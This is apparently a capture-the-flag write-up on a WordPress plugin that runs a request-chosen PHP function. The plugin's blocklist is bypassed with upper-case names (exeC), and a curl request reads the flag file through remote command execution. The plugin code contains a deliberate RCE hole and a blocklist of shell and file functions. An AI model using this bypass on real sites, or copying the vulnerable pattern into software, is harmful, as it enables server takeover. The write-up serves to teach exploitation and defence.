# Cool Templates

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 20 solves / 100 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

I had someone build me a plugin so I can send out some links with special footers. I'm sure the code is safe, right?

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224222559.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/Cool-Templates/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Cool-Templates)-[2025.02.24|22:26:44(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Cool-Templates)-[2025.02.24|22:26:45(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: server-given/
  inflating: server-given/deploy.sh  
  inflating: server-given/Makefile   
   creating: server-given/challenge-custom/
   creating: server-given/challenge-custom/custom-footer/
  inflating: server-given/challenge-custom/custom-footer/custom-footer.php  
 extracting: server-given/challenge-custom/flag.txt  
   creating: server-given/docker/
   creating: server-given/docker/wordpress/
   creating: server-given/docker/wordpress/toolbox/
  inflating: server-given/docker/wordpress/toolbox/Makefile  
  inflating: server-given/docker/wordpress/toolbox/Dockerfile  
  inflating: server-given/Dockerfile  
  inflating: server-given/.env       
  inflating: server-given/docker-compose.yml  
```

Just like my writeup for the other challenges, we should first take a look at the `docker/wordpress/toolbox/Makefile` file:

```bash
[...]
$(WP_CLI) plugin activate custom-footer
```

In here, the WordPress site is installed with a plugin called `custom-footer`. Let's read this plugin's soruce code!

In `server-given/challenge-custom/custom-footer/custom-footer.php`, it just has this simple `wp_footer` hook with callback function `add_custom_footer`:

```php
function add_custom_footer() {
    $blacklist = array("system", "passthru", "proc_open", "shell_exec", "include_once", "require", "require_once", "eval", "fopen",'fopen', 'tmpfile', 'bzopen', 'gzopen', 'chgrp', 'chmod', 'chown', 'copy', 'file_put_contents', 'lchgrp', 'lchown', 'link', 'mkdir', 'move_uploaded_file', 'rename', 'rmdir', 'symlink', 'tempnam', 'touch', 'unlink', 'imagepng', 'imagewbmp', 'image2wbmp', 'imagejpeg', 'imagexbm', 'imagegif', 'imagegd', 'imagegd2', 'iptcembed', 'ftp_get', 'ftp_nb_get', 'file_exists', 'file_get_contents', 'file', 'fileatime', 'filectime', 'filegroup', 'fileinode', 'filemtime', 'fileowner', 'fileperms', 'filesize', 'filetype', 'glob', 'is_dir', 'is_executable', 'is_file', 'is_link', 'is_readable', 'is_uploaded_file', 'is_writable', 'is_writeable', 'linkinfo', 'lstat', 'parse_ini_file', 'pathinfo', 'readfile', 'readlink', 'realpath', 'stat', 'gzfile', 'readgzfile', 'getimagesize', 'imagecreatefromgif', 'imagecreatefromjpeg', 'imagecreatefrompng', 'imagecreatefromwbmp', 'imagecreatefromxbm', 'imagecreatefromxpm', 'ftp_put', 'ftp_nb_put', 'exif_read_data', 'read_exif_data', 'exif_thumbnail', 'exif_imagetype', 'hash_file', 'hash_hmac_file', 'hash_update_file', 'md5_file', 'sha1_file', 'highlight_file', 'show_source', 'php_strip_whitespace', 'get_meta_tags', 'extract', 'parse_str', 'putenv', 'ini_set', 'mail', 'header', 'proc_nice', 'proc_terminate', 'proc_close', 'pfsockopen', 'fsockopen', 'apache_child_terminate', 'posix_kill', 'posix_mkfifo', 'posix_setpgid', 'posix_setsid', 'posix_setuid', 'phpinfo', 'posix_mkfifo', 'posix_getlogin', 'posix_ttyname', 'getenv', 'get_current_user', 'proc_get_status', 'get_cfg_var', 'disk_free_space', 'disk_total_space', 'diskfreespace', 'getcwd', 'getlastmo', 'getmygid', 'getmyinode', 'getmypid', 'getmyuid', 'create_function', 'exec', 'popen', 'proc_open', 'pcntl_exec');
    if (isset($_REQUEST['template']) && isset($_REQUEST['content'])) {
        $template = $_REQUEST['template'];
        $content = wp_unslash(urldecode(base64_decode($_REQUEST['content'])));
        if(preg_match('/^[a-zA-Z0-9]+$/', $template) && !in_array($template, $blacklist)) {
            $footer = $template($content);
            echo $footer;
        }
    }
}

add_action('wp_footer', 'add_custom_footer');
```

In this callback function, if our request parameter `template` and `content` is set, it'll base64 decode our `content` parameter's value, and dynamically invoke the function (`$template($content)`).

However, there's a regex pattern and blacklisted functions that we can't use. Hmm... Can we bypass that?

Since the regex pattern only allows us to call functions that with alphanumeric name, maybe we could potentially find some useful functions to achieve RCE (Remote Code Execution)? And of course, the function also is not in the blacklisted array.

To find such functions, we can setup our own local WordPress site, install the plugin, modify the plugin's `custom-footer.php` file to add the following code after the `wp_footer` hook:

```php
// the following code is in the bottom of `custom-footer.php`
$blacklist = array("system", "passthru", "proc_open", "shell_exec", "include_once", "require", "require_once", "eval", "fopen",'fopen', 'tmpfile', 'bzopen', 'gzopen', 'chgrp', 'chmod', 'chown', 'copy', 'file_put_contents', 'lchgrp', 'lchown', 'link', 'mkdir', 'move_uploaded_file', 'rename', 'rmdir', 'symlink', 'tempnam', 'touch', 'unlink', 'imagepng', 'imagewbmp', 'image2wbmp', 'imagejpeg', 'imagexbm', 'imagegif', 'imagegd', 'imagegd2', 'iptcembed', 'ftp_get', 'ftp_nb_get', 'file_exists', 'file_get_contents', 'file', 'fileatime', 'filectime', 'filegroup', 'fileinode', 'filemtime', 'fileowner', 'fileperms', 'filesize', 'filetype', 'glob', 'is_dir', 'is_executable', 'is_file', 'is_link', 'is_readable', 'is_uploaded_file', 'is_writable', 'is_writeable', 'linkinfo', 'lstat', 'parse_ini_file', 'pathinfo', 'readfile', 'readlink', 'realpath', 'stat', 'gzfile', 'readgzfile', 'getimagesize', 'imagecreatefromgif', 'imagecreatefromjpeg', 'imagecreatefrompng', 'imagecreatefromwbmp', 'imagecreatefromxbm', 'imagecreatefromxpm', 'ftp_put', 'ftp_nb_put', 'exif_read_data', 'read_exif_data', 'exif_thumbnail', 'exif_imagetype', 'hash_file', 'hash_hmac_file', 'hash_update_file', 'md5_file', 'sha1_file', 'highlight_file', 'show_source', 'php_strip_whitespace', 'get_meta_tags', 'extract', 'parse_str', 'putenv', 'ini_set', 'mail', 'header', 'proc_nice', 'proc_terminate', 'proc_close', 'pfsockopen', 'fsockopen', 'apache_child_terminate', 'posix_kill', 'posix_mkfifo', 'posix_setpgid', 'posix_setsid', 'posix_setuid', 'phpinfo', 'posix_mkfifo', 'posix_getlogin', 'posix_ttyname', 'getenv', 'get_current_user', 'proc_get_status', 'get_cfg_var', 'disk_free_space', 'disk_total_space', 'diskfreespace', 'getcwd', 'getlastmo', 'getmygid', 'getmyinode', 'getmypid', 'getmyuid', 'create_function', 'exec', 'popen', 'proc_open', 'pcntl_exec');

$functions = get_defined_functions();
foreach($functions as $function) {
    foreach($function as $functionName) {
        $isAlphanumericFunctionName = preg_match('/^[a-zA-Z0-9]+$/', $functionName);
        $isFunctionNameInBlacklistedArray = in_array($functionName, $blacklist);
    
        if ($isAlphanumericFunctionName === 0 || $isFunctionNameInBlacklistedArray === true) {
            continue;
        }

        echo "$functionName\n";
    }
}
```

In here, we used PHP function `get_defined_functions` to get all the available functions and only outputs the function names that are alphanumeric and not in the blacklisted array.

If we update the plugin's PHP file into the above, we can send a GET request to `/` and get all the function names that we want:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Cool-Templates)-[2025.02.26|15:22:43(HKT)]
└> curl --get http://localhost/
strlen
strcmp
strncmp
strcasecmp
strncasecmp
define
[...]
noindex
simpletext
bigtext
gradientfooter
```

After painfully reading all the function's documentation, I found the following functions might be interesting to us:

```php
// PHP built-in functions
iconv

assert

imagecreatefromavif
imagecreatefromwebp
imagecreatefromgd
imagecreatefromgd2
imagecreatefromgd2part
imagecreatefrombmp
imagecreatefromtga
dir
scandir

unserialize

virtual

define
constant
```

Let starts with PHP function [`iconv`](https://www.php.net/manual/en/function.iconv.php). In this function, before PHP version 8.3.7, it is possible to perform a heap buffer overflow using function `iconv`. (The research blog post is in [here](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)). But... The challenge is using the latest PHP version. So nope.

For PHP function [`assert`](https://www.php.net/manual/en/function.assert.php), prior to PHP version 8.0.0, if the `$assertion` parameter is a string, PHP will call function [`eval`](https://www.php.net/manual/en/function.eval.php) to evaluate the string. This means if the `$assertion` is controllable by the attacker, it is effectively calling `eval`, thus achieving RCE. Well, again, the challenge is using the latest PHP version.

In [PHP's GD and Image related functions](https://www.php.net/manual/en/ref.image.php), we can use function such as [`imagecreatefromavif`](https://www.php.net/manual/en/function.imagecreatefromavif.php) to leak arbitrary files' content using PHP filter chain. (See [Synacktiv's blog post](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) for more details). So, maybe we can leak the flag file's content using this technique?

Unfortunately, in `server-given/Dockerfile`, a random string is appended into the flag filename:

```bash
[...]
COPY challenge-custom/flag.txt /flag-REDACTED.txt
RUN chmod 0444 /flag-REDACTED.txt
```

Can we somehow leak the filename, then?

If we look at PHP function [`dir`](https://www.php.net/manual/en/function.dir.php) and [`scandir`](https://www.php.net/manual/en/function.scandir.php) documentation, the first parameter is the string for a directory path. Maybe we can leak the flag filename?

`dir`:

```http
GET /?template=dir&content=Lw== HTTP/1.1
Host: localhost


```

> Note: The base64 encoded string of `/` is `Lw==`.

Error:

```php
Uncaught Error: Object of class Directory could not be converted to string
```

`scandir`:

```http
GET /?template=scandir&content=Lw== HTTP/1.1
Host: localhost


```

Response:

```html
[...]
Array<script id="wp-block-template-skip-link-js-after">
[...]
```

Well, as you can see, the `dir` function returns an object, in which `echo` try to convert it as a string but failed. In `scandir`, `echo` converts the returned array into string, which is just `Array`.

So nope, we can't use GD Image's functions to leak the flag because we don't have the flag's filename.

How about [`unserialize`](https://www.php.net/manual/en/function.unserialize.php)? Maybe WordPress Core has some known POP gadgets that we can use? If we search for that, we can see this blog post: [Gadgets chain in Wordpress](https://fenrisk.com/gadgets-chain-in-wordpress). In that blog post, it mentioned that class `WP_HTML_Token` has the following POP gadget:

```php
class WP_HTML_Token {
    [...]
    public $bookmark_name = null;
    [...]
    public $on_destroy = null;
    [...]
    public function __destruct() {
        if ( is_callable( $this->on_destroy ) ) {
            call_user_func( $this->on_destroy, $this->bookmark_name );
        }
    }
}
```

As you can see, it uses PHP function [`call_user_func`](https://www.php.net/manual/en/function.call-user-func.php) to call any functions based on the value of attribute `on_destroy`. The arguments of the function are in attribute `bookmark_name`.

However, after version 6.4.2, WordPress Core maintainers added the following `__wakeup` magic method, which prevents this class from being unserialized:

```php
class WP_HTML_Token {
    [...]
    public function __wakeup() {
        throw new \LogicException( __CLASS__ . ' should never be unserialized' );
    }
}
```

This is because the `__wakeup` magic method is executed prior to any serialization. When this magic method is called, it'll throw an exception, thus effectively prevent this class from being unserialized.

And again, the challenge is using the latest WordPress version, so `unserialize` is useless for us. Unless we can find a new POP gadget chain.

Hmm... How about PHP function [`virtual`](https://www.php.net/manual/en/function.virtual.php)? According to PHP's documentation, it says this function performs an Apache sub-request. This function is similar to [include](https://www.php.net/manual/en/function.include.php) or [require](https://www.php.net/manual/en/function.require.php). But, to read the flag file, we need to somehow leak the filename, which is not possible in this case.

For PHP function [`define`](https://www.php.net/manual/en/function.define.php), we can define a named constant. Maybe we can try to overwrite a constant's value??

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Cool-Templates)-[2025.02.26|15:57:44(HKT)]
└> php -a                  
[...]
php > define('FOO', 'bar');
php > define('FOO', 'anything');
PHP Warning:  Constant FOO already defined in php shell code on line 1
```

Ah balls. Nope.

How about PHP function [`constant`](https://www.php.net/manual/en/function.constant.php)?? This function returns the value of a constant by the constant name. But what constants we want to read?

Same as getting all the defined functions, we can use PHP function [`get_defined_constants`](https://www.php.net/manual/en/function.get-defined-constants.php) to get all the defined contants:

```php
// the following code is in the bottom of `custom-footer.php`
$constants = get_defined_constants();
foreach($constants as $key => $value) {
    echo "$key = $value\n";
}
```

```php
E_ERROR = 1
E_WARNING = 2
E_PARSE = 4
E_NOTICE = 8
[...]
COOKIE_DOMAIN = 
RECOVERY_MODE_COOKIE = wordpress_rec_86a9106ae65537651a8e456835b316ab
FORCE_SSL_ADMIN = 
```

Among all the constants, there are some interesting ones:

```php
COOKIEHASH = 86a9106ae65537651a8e456835b316ab
USER_COOKIE = wordpressuser_86a9106ae65537651a8e456835b316ab
PASS_COOKIE = wordpresspass_86a9106ae65537651a8e456835b316ab
AUTH_COOKIE = wordpress_86a9106ae65537651a8e456835b316ab
SECURE_AUTH_COOKIE = wordpress_sec_86a9106ae65537651a8e456835b316ab
LOGGED_IN_COOKIE = wordpress_logged_in_86a9106ae65537651a8e456835b316ab
RECOVERY_MODE_COOKIE = wordpress_rec_86a9106ae65537651a8e456835b316ab
```

Hmm... Cookie? Maybe we can forge our own session cookies?

If we look at WordPress Core function `wp_validate_auth_cookie`, after parsing our session cookie (`AUTH_COOKIE`, `SECURE_AUTH_COOKIE`, or `LOGGED_IN_COOKIE`), it'll check our cookie's HMAC value is match to the function computed one or not:

```php
function wp_validate_auth_cookie( $cookie = '', $scheme = '' ) {
    $cookie_elements = wp_parse_auth_cookie( $cookie, $scheme );
    [...]
    $scheme     = $cookie_elements['scheme'];
    $username   = $cookie_elements['username'];
    $hmac       = $cookie_elements['hmac'];
    $token      = $cookie_elements['token'];
    $expired    = $cookie_elements['expiration'];
    $expiration = $cookie_elements['expiration'];
    [...]
    $user = get_user_by( 'login', $username );
    [...]
    $pass_frag = substr( $user->user_pass, 8, 4 );

    $key = wp_hash( $username . '|' . $pass_frag . '|' . $expiration . '|' . $token, $scheme );
    
    // If ext/hash is not present, compat.php's hash_hmac() does not support sha256.
    $algo = function_exists( 'hash' ) ? 'sha256' : 'sha1';
    $hash = hash_hmac( $algo, $username . '|' . $expiration . '|' . $token, $key );
    if ( ! hash_equals( $hash, $hmac ) ) {
        [...]
    }
}
```

As you can see, the function compute the HMAC with the input of `$username|$expiration|$token` and with the key, which is the hash value of input `$username|$pass_frag|$expiration|$token`.

Huh, the key includes the user's 4 characters password fragment. But, the fragment is start from offset `8`. So, we need to brute force that password fragment if we don't know the user's password in order to pass the HMAC check.

However, even if we pass the HMAC check, it'll also check the session is really existed or not:

```php
function wp_validate_auth_cookie( $cookie = '', $scheme = '' ) {
    [...]
    $manager = WP_Session_Tokens::get_instance( $user->ID );
    if ( ! $manager->verify( $token ) ) {
        [...]
        do_action( 'auth_cookie_bad_session_token', $cookie_elements );
        return false;
    }
}
```

With that said, we can't forge our own session cookies that easily.

Huh... It seems like there's no functions that could gain RCE. Maybe there's another approach?

## Exploitation

Since the blacklisted functions check didn't convert our function name (`$template`) to lower-case characters, maybe we can leverage upper-case characters to bypass the check?

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Cool-Templates)-[2025.02.26|16:37:35(HKT)]
└> php -a
[...]
php > echo exeC("whoami");
siunam
```

Oh my god, PHP, why?!?!?

Anyways, we can now bypass the validations with just a simple upper-case characters trick.

Therefore, to get the flag, we can send the following request:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Cool-Templates)-[2025.02.26|16:46:16(HKT)]
└> curl --get http://52.77.81.199:9122/ --data "template=exeC&content=$(echo 'cat /flag*.txt' | base64)"
[...]
CTF{C00l_T3mpl4t3s_759eee4d}<script id="wp-block-template-skip-link-js-after">
```

- **Flag: `CTF{C00l_T3mpl4t3s_759eee4d}`**

## Conclusion

What we've learned:

1. Dynamic function call filter bypass via upper-case characters